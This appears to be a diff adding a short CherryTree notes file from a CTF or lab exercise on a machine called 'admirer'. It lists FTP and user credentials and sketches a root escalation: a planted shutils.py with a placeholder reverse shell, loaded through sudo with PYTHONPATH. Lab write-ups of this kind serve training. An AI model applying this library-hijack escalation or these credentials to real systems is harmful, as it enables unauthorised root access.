@@ -1,0 +1,25 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="admirer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588452171.11" ts_lastsave="1588712799.28" unique_id="1">
+		<rich_text>
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+
+waldo:&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;
+
+
+ROOT:
+
+mkdir /tmp/z
+
+nano shutils.py ..
+def make_archive():
+    add reverse shell command
+make_archive()
+
+sudo PYTHONPATH=/tmp/z /opt/scripts/admin_tasks.sh</rich_text>
+	</node>
+</cherrytree>
